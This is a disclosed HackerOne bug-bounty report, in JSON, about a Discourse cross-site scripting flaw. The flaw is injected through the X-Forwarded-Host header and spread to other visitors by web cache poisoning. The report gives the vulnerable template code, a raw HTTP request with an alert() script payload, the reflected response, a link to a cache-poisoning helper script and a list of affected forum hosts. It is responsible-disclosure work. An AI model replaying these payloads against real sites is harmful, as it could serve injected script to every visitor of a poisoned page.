{"id":394016,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTQwMTY=","url":"https://hackerone.com/reports/394016","title":"Web Cache Deception Attack (XSS)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-08-13T06:04:57.161Z","submitted_at":"2018-08-13T06:04:57.161Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bobrov","url":"/bobrov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16893,"url":"https://hackerone.com/discourse","handle":"discourse","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Discourse","twitter_handle":"discourse","website":"https://discourse.org","about":"Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-11-18T07:09:41.188Z","bug_reporter_agreed_on_going_public_at":"2018-10-19T07:09:36.947Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"This XSS does not affect the try.discourse.org, but worked on many other Discourse instances, that i tested. In discussions with the Mozilla team, we came to the conclusion that this is a vulnerability in the Discourse and it needs to be sent through this program.\nList of vulnerable hosts:\n```\ndiscourse.mozilla.org\nforum.learning.mozilla.org\nforum.glasswire.com\nhelp.nextcloud.com\nmeta.discourse.org\n```\n\nDescription XSS\n===\nThe Web application is vulnerable to XSS through the X-Forwarded-Host header. \n\n**Vulnerable code**\nhttps://github.com/discourse/discourse/blob/master/app/views/common/_special_font_face.html.erb#L12-L18\n```\n\u003c% woff2_url = \"#{asset_path(\"fontawesome-webfont.woff2\")}?#{font_domain}\u0026v=4.7.0\".html_safe %\u003e\n\n\u003clink rel=\"preload\" href=\"\u003c%=woff2_url%\u003e\" as=\"font\" type=\"font/woff2\" crossorigin /\u003e\n...\n    src: url('\u003c%=woff2_url %\u003e') format('woff2'),\n```\n\n\n\n\n**HTTP Request**\n```http\nGET /?xx HTTP/1.1\nHost: meta.discourse.org\nX-Forwarded-Host: cacheattack'\"\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\n```\n\n**HTTP Response**\n```html\n\u003clink rel=\"preload\" \n   href=\"https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'\"\u003e\n   \u003cscript\u003ealert(document.domain)\u003c/script\u003e\n   \u00262\u0026v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin /\u003e\n\u003cstyle\u003e\n  @font-face {\n    font-family: 'FontAwesome';\n    src: url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'\"\u003e\n    \u003cscript\u003ealert(document.domain)\u003c/script\u003e\n    \u00262\u0026v=4.7.0') format('woff2'),\n         url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-ba0c59deb5450f5cb41b3f93609ee2d0d995415877ddfa223e8a8a7533474f07.woff?https://cacheattack\u0026#39;\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u0026amp;2\u0026v=4.7.0') format('woff');\n  }\n\u003c/style\u003e\n```\n\nWeb Cache Deception\n===\nAlso, the application caches the HTTP response for 1 minute, so if you send an HTTP request with XSS payload, it will be cached and will be displayed for all requests when the headers match:\nRequest Start Line, Accept, Accept-Encoding.\n\n**Steps To Reproduce**\nFor a simpler demonstration, I wrote a script.\nThe script takes the necessary headers from the request and poisons the cache.\nYou just need to open the cached page.\n\n1) Open URL\n```\nhttps://blackfan.ru/bugbounty/webcachedeception.php?url=https://meta.discourse.org/?cacheattack\u0026payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E\u0026cache=60\n```\n2) Open the cached URL that the script displays.\n\n3) Result\n\n{F332797}\n\n## Impact\n\nAttacker can collect the popular combinations of Accep + Accept-Encoding and poison the cache of the web pages every minute.\nThe impact is like a stored XSS on any page.","vulnerability_information_html":"\u003cp\u003eThis XSS does not affect the try.discourse.org, but worked on many other Discourse instances, that i tested. In discussions with the Mozilla team, we came to the conclusion that this is a vulnerability in the Discourse and it needs to be sent through this program.\u003cbr\u003e\nList of vulnerable hosts:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ediscourse.mozilla.org\nforum.learning.mozilla.org\nforum.glasswire.com\nhelp.nextcloud.com\nmeta.discourse.org\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"description-xss\"\u003eDescription XSS\u003c/h1\u003e\n\n\u003cp\u003eThe Web application is vulnerable to XSS through the X-Forwarded-Host header. \u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eVulnerable code\u003c/strong\u003e\u003cbr\u003e\n\u003ca title=\"https://github.com/discourse/discourse/blob/master/app/views/common/_special_font_face.html.erb#L12-L18\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fdiscourse%2Fdiscourse%2Fblob%2Fmaster%2Fapp%2Fviews%2Fcommon%2F_special_font_face.html.erb%23L12-L18\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/discourse/discourse/blob/master/app/views/common/_special_font_face.html.erb#L12-L18\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;% woff2_url = \u0026quot;#{asset_path(\u0026quot;fontawesome-webfont.woff2\u0026quot;)}?#{font_domain}\u0026amp;v=4.7.0\u0026quot;.html_safe %\u0026gt;\n\n\u0026lt;link rel=\u0026quot;preload\u0026quot; href=\u0026quot;\u0026lt;%=woff2_url%\u0026gt;\u0026quot; as=\u0026quot;font\u0026quot; type=\u0026quot;font/woff2\u0026quot; crossorigin /\u0026gt;\n...\n    src: url(\u0026#39;\u0026lt;%=woff2_url %\u0026gt;\u0026#39;) format(\u0026#39;woff2\u0026#39;),\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eHTTP Request\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/?xx\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003emeta.discourse.org\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Forwarded-Host\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ecacheattack\u0026#39;\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eHTTP Response\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;link\u003c/span\u003e \u003cspan class=\"na\"\u003erel=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;preload\u0026quot;\u003c/span\u003e \n   \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack\u0026#39;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n   \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edomain\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n   \u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003e2\u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003ev=4.7.0\u0026quot; as=\u0026quot;font\u0026quot; type=\u0026quot;font/woff2\u0026quot; crossorigin /\u0026gt;\n\u003cspan class=\"nt\"\u003e\u0026lt;style\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"k\"\u003e@font-face\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003efont-family\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#39;FontAwesome\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003esrc\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026quot;\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"err\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"n\"\u003escript\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edomain\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003escript\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ev\u003c/span\u003e\u003cspan class=\"err\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4.7.0\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;) format(\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003ewoff2\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;),\n         url(\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003ehttps\u003c/span\u003e\u003cspan class=\"p\"\u003e://\u003c/span\u003e\u003cspan class=\"n\"\u003ed11a6trkgmumsb\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ecloudfront\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003enet\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eassets\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003efontawesome-webfont-ba0c59deb5450f5cb41b3f93609ee2d0d995415877ddfa223e8a8a7533474f07\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewoff\u003c/span\u003e\u003cspan class=\"err\"\u003e?\u003c/span\u003e\u003cspan class=\"n\"\u003ehttps\u003c/span\u003e\u003cspan class=\"p\"\u003e://\u003c/span\u003e\u003cspan class=\"n\"\u003ecacheattack\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e#39\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026amp;quot;\u0026amp;gt;\u0026amp;lt;script\u0026amp;gt;alert(document.domain)\u0026amp;lt;/script\u0026amp;gt;\u0026amp;amp;2\u0026amp;v=4.7.0\u0026#39;)\u003c/span\u003e \u003cspan class=\"err\"\u003eformat(\u0026#39;woff\u0026#39;);\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/style\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"web-cache-deception\"\u003eWeb Cache Deception\u003c/h1\u003e\n\n\u003cp\u003eAlso, the application caches the HTTP response for 1 minute, so if you send an HTTP request with XSS payload, it will be cached and will be displayed for all requests when the headers match:\u003cbr\u003e\nRequest Start Line, Accept, Accept-Encoding.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eSteps To Reproduce\u003c/strong\u003e\u003cbr\u003e\nFor a simpler demonstration, I wrote a script.\u003cbr\u003e\nThe script takes the necessary headers from the request and poisons the cache.\u003cbr\u003e\nYou just need to open the cached page.\u003c/p\u003e\n\n\u003cp\u003e1) Open URL\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://blackfan.ru/bugbounty/webcachedeception.php?url=https://meta.discourse.org/?cacheattack\u0026amp;payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E\u0026amp;cache=60\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e2) Open the cached URL that the script displays.\u003c/p\u003e\n\n\u003cp\u003e3) Result\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_at_10-00-49.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/332/797/86697ee9723c903d3698983fe2aaf4ef47183b0e/Screenshot_at_10-00-49.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_10-00-49.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_10-00-49.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVBWWKZ4H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055007Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCmEbZvVQ%2FI1GHRJjrhZK2Y6zh4lCWK725%2FwOpNu%2BnZkAIhAIZlqGHog%2B4PZMdnvhSU5APZbycPDz1wpNXbi5uE94ueKrQDCFUQARoMMDEzNjE5Mjc0ODQ5IgxU5AAHhqo1cPAzbTcqkQOGB5pEHXl6QCBCTSHUmyd%2FF8M3rpTqzp%2BOigrWU%2BrXYHZYm%2BGDawsiXhnqeD9o8Qw0b%2Fr0efVbRmhj5baoPrxgSiY%2B9zsreR3qClZZKnS0%2Brs8OqiMGd3clBbyfOxw2fa2vgQglV4dLF6EXSiGfxOms8eWdw%2F8mPtc81dMxDIlxTs50KUnd6aUjgG5BJs2k%2FL0rOKXYBS%2FdVqIQdN8JcCKMvqDv0u7pvSGEecQXa7pGdf07ufO02E64eU0OnaTeNyoq7WlZzT%2FGyvHjVtIvbXdPW15pwZm2Q4u8%2FW7ksSv4%2BxsESWLLCop0OeGUhtIppCDQlaMPC9JTj0HYKbMEGmZagmLfgHX4DKRg75%2FLNQViGcE%2FRCCaMxd6wrsv0dlz4dekjWvp4mXzLFkuKBM6c%2F%2BAemkmkgOJKnp%2FJUV1zJTe%2BO14GyIigsvxJqvrnKvkmsUrYwar1bX%2Be7UkqGzVbMAlsbRDNIOok7bVRXerhpXnbqFQsLWlqe%2BNfa4gSSfmgu4iIjCRRMdTWsvy2NQHfTsGjDAzar%2FBTrqAcniMm3eG7%2BxDZb9XVqMyQiSNyiuBD8pwO78bO8T3Uu8vSI3S05C6UCutmNkOnjR9D2NZaOgbFO4YujbW%2FY0mhhdjSppvg%2Bzdgu0AfZOou0DDwqm4vwEc0ekiNYUD6KHvD5tZwOaalihV5dSfbzoDyvfsJI6x7RYpBZmwPcshKw3Csz0uZew1JqrbUJVmc9v6q0aXols8bxyDKKPfp6siyzKhHELgTS3XGskds%2BWx5FaWemc%2Bo8QqyIuoOtWjmUwF39ydFOfg%2FyeKdwBxELGLKCSN8MyV6ov7IBrib4UiM%2F6l36ymDoHIX8ohg%3D%3D\u0026amp;X-Amz-Signature=bda3a604762b7a86dd29f8ecce7dce5c84589a28e55d4704e9340f3cde013c9b\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/332/797/86697ee9723c903d3698983fe2aaf4ef47183b0e/Screenshot_at_10-00-49.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_10-00-49.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_10-00-49.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVBWWKZ4H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055007Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCmEbZvVQ%2FI1GHRJjrhZK2Y6zh4lCWK725%2FwOpNu%2BnZkAIhAIZlqGHog%2B4PZMdnvhSU5APZbycPDz1wpNXbi5uE94ueKrQDCFUQARoMMDEzNjE5Mjc0ODQ5IgxU5AAHhqo1cPAzbTcqkQOGB5pEHXl6QCBCTSHUmyd%2FF8M3rpTqzp%2BOigrWU%2BrXYHZYm%2BGDawsiXhnqeD9o8Qw0b%2Fr0efVbRmhj5baoPrxgSiY%2B9zsreR3qClZZKnS0%2Brs8OqiMGd3clBbyfOxw2fa2vgQglV4dLF6EXSiGfxOms8eWdw%2F8mPtc81dMxDIlxTs50KUnd6aUjgG5BJs2k%2FL0rOKXYBS%2FdVqIQdN8JcCKMvqDv0u7pvSGEecQXa7pGdf07ufO02E64eU0OnaTeNyoq7WlZzT%2FGyvHjVtIvbXdPW15pwZm2Q4u8%2FW7ksSv4%2BxsESWLLCop0OeGUhtIppCDQlaMPC9JTj0HYKbMEGmZagmLfgHX4DKRg75%2FLNQViGcE%2FRCCaMxd6wrsv0dlz4dekjWvp4mXzLFkuKBM6c%2F%2BAemkmkgOJKnp%2FJUV1zJTe%2BO14GyIigsvxJqvrnKvkmsUrYwar1bX%2Be7UkqGzVbMAlsbRDNIOok7bVRXerhpXnbqFQsLWlqe%2BNfa4gSSfmgu4iIjCRRMdTWsvy2NQHfTsGjDAzar%2FBTrqAcniMm3eG7%2BxDZb9XVqMyQiSNyiuBD8pwO78bO8T3Uu8vSI3S05C6UCutmNkOnjR9D2NZaOgbFO4YujbW%2FY0mhhdjSppvg%2Bzdgu0AfZOou0DDwqm4vwEc0ekiNYUD6KHvD5tZwOaalihV5dSfbzoDyvfsJI6x7RYpBZmwPcshKw3Csz0uZew1JqrbUJVmc9v6q0aXols8bxyDKKPfp6siyzKhHELgTS3XGskds%2BWx5FaWemc%2Bo8QqyIuoOtWjmUwF39ydFOfg%2FyeKdwBxELGLKCSN8MyV6ov7IBrib4UiM%2F6l36ymDoHIX8ohg%3D%3D\u0026amp;X-Amz-Signature=bda3a604762b7a86dd29f8ecce7dce5c84589a28e55d4704e9340f3cde013c9b\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAttacker can collect the popular combinations of Accep + Accept-Encoding and poison the cache of the web pages every minute.\u003cbr\u003e\nThe impact is like a stored XSS on any page.\u003c/p\u003e\n","bounty_amount":"256.0","formatted_bounty":"$256","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":332797,"file_name":"Screenshot_at_10-00-49.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/332/797/86697ee9723c903d3698983fe2aaf4ef47183b0e/Screenshot_at_10-00-49.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_10-00-49.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_10-00-49.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVBWWKZ4H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055007Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCmEbZvVQ%2FI1GHRJjrhZK2Y6zh4lCWK725%2FwOpNu%2BnZkAIhAIZlqGHog%2B4PZMdnvhSU5APZbycPDz1wpNXbi5uE94ueKrQDCFUQARoMMDEzNjE5Mjc0ODQ5IgxU5AAHhqo1cPAzbTcqkQOGB5pEHXl6QCBCTSHUmyd%2FF8M3rpTqzp%2BOigrWU%2BrXYHZYm%2BGDawsiXhnqeD9o8Qw0b%2Fr0efVbRmhj5baoPrxgSiY%2B9zsreR3qClZZKnS0%2Brs8OqiMGd3clBbyfOxw2fa2vgQglV4dLF6EXSiGfxOms8eWdw%2F8mPtc81dMxDIlxTs50KUnd6aUjgG5BJs2k%2FL0rOKXYBS%2FdVqIQdN8JcCKMvqDv0u7pvSGEecQXa7pGdf07ufO02E64eU0OnaTeNyoq7WlZzT%2FGyvHjVtIvbXdPW15pwZm2Q4u8%2FW7ksSv4%2BxsESWLLCop0OeGUhtIppCDQlaMPC9JTj0HYKbMEGmZagmLfgHX4DKRg75%2FLNQViGcE%2FRCCaMxd6wrsv0dlz4dekjWvp4mXzLFkuKBM6c%2F%2BAemkmkgOJKnp%2FJUV1zJTe%2BO14GyIigsvxJqvrnKvkmsUrYwar1bX%2Be7UkqGzVbMAlsbRDNIOok7bVRXerhpXnbqFQsLWlqe%2BNfa4gSSfmgu4iIjCRRMdTWsvy2NQHfTsGjDAzar%2FBTrqAcniMm3eG7%2BxDZb9XVqMyQiSNyiuBD8pwO78bO8T3Uu8vSI3S05C6UCutmNkOnjR9D2NZaOgbFO4YujbW%2FY0mhhdjSppvg%2Bzdgu0AfZOou0DDwqm4vwEc0ekiNYUD6KHvD5tZwOaalihV5dSfbzoDyvfsJI6x7RYpBZmwPcshKw3Csz0uZew1JqrbUJVmc9v6q0aXols8bxyDKKPfp6siyzKhHELgTS3XGskds%2BWx5FaWemc%2Bo8QqyIuoOtWjmUwF39ydFOfg%2FyeKdwBxELGLKCSN8MyV6ov7IBrib4UiM%2F6l36ymDoHIX8ohg%3D%3D\u0026X-Amz-Signature=bda3a604762b7a86dd29f8ecce7dce5c84589a28e55d4704e9340f3cde013c9b","file_size":9357,"type":"image/png"}],"allow_singular_disclosure_at":"2018-11-18T07:09:36.976Z","allow_singular_disclosure_after":-66696030.129035436,"singular_disclosure_allowed":true,"vote_count":31,"voters":["sourc7","bobrov","spam404","base_64","sameerphad72","s_p_q_r","ras-it","mygf","eveeez","ms-13","and 21 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3189139,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks, this was indeed some old code from 2013 in the font header that should have been removed. Good find, though we believe it is difficult to exploit, and mostly 'affects' anons who have no credentials to steal.","markdown_message":"\u003cp\u003eThanks, this was indeed some old code from 2013 in the font header that should have been removed. Good find, though we believe it is difficult to exploit, and mostly \u0026#39;affects\u0026#39; anons who have no credentials to steal.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-13T21:27:18.244Z","updated_at":"2018-08-13T21:27:18.244Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bobrov","url":"/bobrov"},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3189141,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-13T21:27:41.395Z","updated_at":"2018-08-13T21:27:41.395Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Discourse"}},"bounty_amount":"256.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"discourse","collaborator":{"username":"bobrov","url":"/bobrov"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3501601,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-19T07:09:36.961Z","updated_at":"2018-10-19T07:09:36.961Z","first_to_agree":true,"actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3674088,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-18T07:09:41.201Z","updated_at":"2018-11-18T07:09:41.201Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Discourse"}},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":11850,"category":"researcher","content":"* Web Cache Poisoning\n===","can_view?":true,"can_edit?":false,"content_html":"\u003ch1 id=\"web-cache-poisoning\"\u003e* Web Cache Poisoning\u003c/h1\u003e\n"}]}